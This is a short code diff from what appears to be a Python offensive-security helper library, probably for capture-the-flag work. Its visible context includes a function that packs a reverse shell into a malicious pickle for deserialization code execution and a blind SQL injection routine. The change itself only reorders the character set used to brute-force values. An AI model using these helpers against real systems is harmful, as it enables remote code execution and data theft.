@@ -48,8 +48,10 @@ class PickleRCE:
 def pickle_rev_shell(host, port, typ="python", protocol=None):
 	return pickle.dumps(PickleRCE(rev_shell(host, port, typ)), protocol)
 
-_chars = (string.ascii_letters + string.digits + string.punctuation +
-	string.whitespace).translate(str.maketrans("", "", "%_*?")) + "_?*%"
+_chars = (
+	string.ascii_letters + " " + string.digits + string.punctuation +
+	string.whitespace.replace(" ", "")
+).translate(str.maketrans("", "", "%_*?")) + "_?*%"
 # make sure GLOB and LIKE special characters match last
 
 def blind_sqli(inject_template, sqli_oracle, chars=_chars):
